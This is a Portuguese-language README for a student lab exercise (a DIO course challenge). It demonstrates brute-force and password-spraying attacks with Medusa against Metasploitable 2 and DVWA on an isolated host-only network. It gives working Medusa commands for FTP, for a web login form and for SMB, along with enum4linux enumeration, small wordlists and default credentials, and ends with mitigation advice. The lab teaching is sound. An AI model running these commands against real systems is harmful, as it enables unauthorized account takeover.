# projeto-medusa-dio
Projeto: Ataques de Força Bruta com Kali Linux e Medusa

Este projeto foi desenvolvido como parte do desafio da DIO – Segurança Ofensiva com Kali Linux, demonstrando ataques de força bruta e password spraying usando o Medusa em um ambiente seguro e isolado.


 1. Ambiente Utilizado
 Máquinas Virtuais
Máquina	Sistema	Função	Rede
Kali Linux	Kali 2024.x	Atacante	Host-Only
Metasploitable 2	Ubuntu Vuln	Alvo com serviços vulneráveis	Host-Only
DVWA	Aplicação web vulnerável	Teste de força bruta Web	Host-Only
 
 2. Configuração da Rede (VirtualBox)

Utilizei a rede Host-Only para isolar o laboratório.

IPs usados:

Kali Linux → 192.168.56.10

Metasploitable 2 → 192.168.56.20

 Teste de comunicação
ping 192.168.56.20

 3. Wordlists Criadas

Dentro da pasta /wordlists, utilizei listas simples:

users.txt
admin
msfadmin
user
test
hanna

passwords.txt
123456
password
admin
msfadmin
toor

 4. Ataque 1 — Força Bruta em FTP

O Metasploitable2 possui FTP vulnerável ativo na porta 21.

 Varredura inicial
nmap -sV 192.168.56.20 -p 21

 Ataque com Medusa
medusa -h 192.168.56.20 -u msfadmin -P wordlists/passwords.txt -M ftp

 Resultado esperado

O serviço retorna sucesso com:

msfadmin : msfadmin


 5. Ataque 2 — Força Bruta em Formulário Web (DVWA)

A DVWA está disponível em:

http://192.168.56.20/dvwa/login.php

 Login inicial
admin / password


 Ataque com Medusa usando http-form
medusa -h 192.168.56.20 -M http-form \
  -U wordlists/users.txt \
  -P wordlists/passwords.txt \
  -m FORM:"/dvwa/login.php" \
  -m FORM-DATA:"username=^USER^&password=^PASS^&Login=Login" \
  -m DENY-SIGNAL:"Login failed"


O Medusa retorna o usuário e senha corretos.


 6. Ataque 3 — Password Spraying em SMB

Primeiro, fiz enumeração de usuários:

 Enumeração
enum4linux -a 192.168.56.20


Depois, ataquei SMB:

 Password Spraying
medusa -h 192.168.56.20 -U wordlists/users.txt -p msfadmin -M smbnt


Se qualquer usuário usar senha fraca repetida, o Medusa retorna SUCCESS.


 7. Recomendações de Mitigação

✔ Senhas fortes e políticas de complexidade
✔ Bloqueio após tentativas falhas
✔ MFA sempre que possível
✔ Desabilitar serviços inseguros (FTP, Telnet)
✔ Atualização contínua
✔ Monitoramento de logs e uso de IDS/IPS
✔ Firewall restringindo portas

 8. Conclusões

Este projeto demonstrou como ataques de força bruta e password spraying podem comprometer sistemas vulneráveis com facilidade.
Utilizando o Kali Linux e o Medusa, foi possível entender:

Como identificar serviços expostos

Como automatizar ataques

Como validar acessos descobertos

A importância de implementar medidas básicas de proteção

Além disso, a documentação serviu para reforçar boas práticas e consolidar o aprendizado em segurança ofensiva.
